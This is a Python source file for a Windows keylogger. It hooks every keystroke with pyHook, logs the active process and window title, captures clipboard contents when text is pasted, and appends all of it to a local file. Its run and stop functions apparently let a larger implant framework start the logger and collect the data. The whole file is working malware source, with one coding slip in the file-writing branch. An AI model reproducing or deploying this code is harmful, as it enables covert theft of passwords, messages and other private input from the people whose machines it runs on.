#!/usr/bin/python
#-*- coding: utf-8 -*-

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

import os

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

filename = "keydump.txt"

def keyDumpFileWriter(filename, data):
	if os.path.isfile(filename):
		f = open(filename, "a")
		result = data
		f.write(data)
		f.close()
	else:
		f = open(filename, "w")
		result = data
		r.write(data)
		f.close()

def get_current_process():
	hwnd = user32.GetForegroundWindow()

	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	process_id = "%d" % pid.value

	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	a = "\r\n[ PID: %s - %s - %s ]\r\n" % (process_id, executable.value, window_title.value)

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

	return a

def KeyStroke(event):
	global current_window
	global a

	if event.WindowName != current_window:
		current_window = event.WindowName
		keyDumpFileWriter(filename,get_current_process())

	if event.Ascii > 32 and event.Ascii < 127:
		keyDumpFileWriter(filename,chr(event.Ascii))
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			keyDumpFileWriter(filename, "[PASTE] - %s" % (pasted_value))
		else:
			keyDumpFileWriter(filename,"[%s]" % event.Key)
	return True

def run(**args):
	kl = pyHook.HookManager()

	kl.KeyDown = KeyStroke

	kl.HookKeyboard()

	pythoncom.PumpMessages()

def stop(**args):
	f = open(filename, "r")
	data = f.read()
	f.close()
	return str(data)
